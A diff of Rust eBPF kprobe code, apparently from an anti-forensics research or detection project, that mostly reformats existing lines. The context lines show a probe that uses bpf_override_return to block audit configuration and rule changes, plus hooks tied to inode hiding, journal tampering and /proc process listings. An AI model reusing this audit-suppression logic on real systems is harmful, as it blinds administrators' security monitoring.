@@ -1,10 +1,10 @@
 use aya_ebpf::{
     helpers::{
-        bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel,
-        bpf_probe_write_user,
+        bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel, bpf_probe_write_user,
     },
     macros::kprobe,
     programs::ProbeContext,
+    EbpfContext,
 };
 use common::{
     EventHeader, EVENT_AUDIT_KILLED, EVENT_INODE_SLACK_HIDE, EVENT_JOURNAL_MANIPULATED,
@@ -48,10 +48,8 @@ fn try_audit_receive_msg(ctx: &ProbeContext) -> Result<u32, i64> {
     }
 
     let skb_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
-    let nlh_ptr: u64 =
-        unsafe { bpf_probe_read_kernel((skb_ptr + 208) as *const u64)? };
-    let msg_type: u16 =
-        unsafe { bpf_probe_read_kernel((nlh_ptr + 4) as *const u16)? };
+    let nlh_ptr: u64 = unsafe { bpf_probe_read_kernel((skb_ptr + 208) as *const u64)? };
+    let msg_type: u16 = unsafe { bpf_probe_read_kernel((nlh_ptr + 4) as *const u16)? };
 
     const AUDIT_SET: u16 = 1001;
     const AUDIT_ADD_RULE: u16 = 1011;
@@ -59,10 +57,8 @@ fn try_audit_receive_msg(ctx: &ProbeContext) -> Result<u32, i64> {
     if msg_type == AUDIT_SET || msg_type == AUDIT_ADD_RULE {
         #[cfg(target_arch = "bpf")]
         unsafe {
-            let _ = aya_ebpf::helpers::gen::bpf_override_return(
-                ctx.as_ptr() as *mut _,
-                (-1i64) as u64,
-            );
+            let _ =
+                aya_ebpf::helpers::gen::bpf_override_return(ctx.as_ptr() as *mut _, (-1i64) as u64);
         }
 
         let event = EventHeader {
@@ -104,11 +100,10 @@ fn try_vfs_write_slack(ctx: &ProbeContext) -> Result<u32, i64> {
     }
 
     let file_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
-    let inode_ptr: u64 =
-        unsafe { bpf_probe_read_kernel((file_ptr + 32) as *const u64)? };
+    let inode_ptr: u64 = unsafe { bpf_probe_read_kernel((file_ptr + 32) as *const u64)? };
     let ino: u64 = unsafe { bpf_probe_read_kernel((inode_ptr + 64) as *const u64)? };
 
-    if let Some(entry) = unsafe { SLACK_HIDE_INODES.get(&ino) } {
+    if let Some(_entry) = unsafe { SLACK_HIDE_INODES.get(&ino) } {
         let event = EventHeader {
             event_type: EVENT_INODE_SLACK_HIDE,
             pid,
@@ -148,8 +143,7 @@ fn try_journal_commit(ctx: &ProbeContext) -> Result<u32, i64> {
     }
 
     let journal_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
-    let j_dev_ino: u64 =
-        unsafe { bpf_probe_read_kernel((journal_ptr + 24) as *const u64)? };
+    let j_dev_ino: u64 = unsafe { bpf_probe_read_kernel((journal_ptr + 24) as *const u64)? };
 
     if unsafe { JOURNAL_TARGETS.get(&j_dev_ino) }.is_some() {
         let event = EventHeader {
@@ -191,15 +185,11 @@ fn try_seq_read_enter(ctx: &ProbeContext) -> Result<u32, i64> {
     }
 
     let file_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
-    let dentry_ptr: u64 =
-        unsafe { bpf_probe_read_kernel((file_ptr + 24) as *const u64)? };
-    let parent_ptr: u64 =
-        unsafe { bpf_probe_read_kernel((dentry_ptr + 24) as *const u64)? };
-    let parent_inode_ptr: u64 =
-        unsafe { bpf_probe_read_kernel((parent_ptr + 48) as *const u64)? };
+    let dentry_ptr: u64 = unsafe { bpf_probe_read_kernel((file_ptr + 24) as *const u64)? };
+    let parent_ptr: u64 = unsafe { bpf_probe_read_kernel((dentry_ptr + 24) as *const u64)? };
+    let _parent_inode_ptr: u64 = unsafe { bpf_probe_read_kernel((parent_ptr + 48) as *const u64)? };
 
-    let name_ptr: u64 =
-        unsafe { bpf_probe_read_kernel((parent_ptr + 40) as *const u64)? };
+    let name_ptr: u64 = unsafe { bpf_probe_read_kernel((parent_ptr + 40) as *const u64)? };
     let first_char: u8 = unsafe { bpf_probe_read_kernel(name_ptr as *const u8)? };
 
     if first_char < b'0' || first_char > b'9' {
